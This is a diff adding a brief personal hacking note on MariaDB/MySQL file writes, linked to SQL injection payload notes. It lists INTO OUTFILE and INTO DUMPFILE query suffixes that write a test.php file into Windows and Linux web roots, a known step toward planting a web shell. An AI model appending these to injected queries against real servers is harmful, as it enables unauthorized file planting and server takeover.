@@ -1,0 +1,14 @@
+# mariadb mysql files write
+at the end of the query
+`INTO OUTFILE 'c:\\inetpub\\wwwroot\\test.php'`
+`INTO OUTFILE '/var/www/html/test.php'`
+`INTO DUMPFILE 'c:\\inetpub\\wwwroot\\test.php'`
+`INTO DUMPFILE '/var/www/html/test.php'`
+
+# References
+- [20221003150983](/zet/20221003150983/) mariadb mysql files
+- ~/kb/hacking/methodology/sqli-manual-mysql-payloads.md
+
+Tags:
+    #assorted
+
